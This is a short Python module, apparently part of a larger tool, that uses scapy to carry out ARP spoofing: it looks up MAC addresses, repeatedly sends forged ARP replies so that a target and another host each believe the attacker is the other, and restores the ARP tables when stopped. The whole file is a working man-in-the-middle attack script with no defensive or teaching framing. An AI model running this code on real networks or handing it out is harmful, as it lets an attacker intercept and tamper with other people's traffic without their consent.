import scapy.all as scapy
import time
from colorama import Fore, Style, init

init(autoreset=True)

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp_request
    answer = scapy.srp(final_packet, iface=interface, timeout=2, verbose=False)[0]
    if answer:
        return answer[0][1].hwsrc
    else:
        raise Exception(f"No response from {ip}")

def spoof(target, spoofed, interface):
    mac = get_mac(target, interface)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, iface=interface, verbose=False)
    print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

def restore(dest_ip, source_ip, interface):
    dest_mac = get_mac(dest_ip, interface)
    source_mac = get_mac(source_ip, interface)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, iface=interface, verbose=False)
    print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")

def run_arp_spoof(target_ip, spoof_ip, interface, stop_event):
    try:
        while not stop_event.is_set():
            spoof(target_ip, spoof_ip, interface)
            spoof(spoof_ip, target_ip, interface)
            time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"[-] Error in ARP spoofing: {e}")
    finally:
        print(Fore.RED + "[!] Stopping ARP spoofing. Restoring ARP tables...")
        restore(target_ip, spoof_ip, interface)
        restore(spoof_ip, target_ip, interface)
        print(Fore.GREEN + "[+] ARP tables restored.")
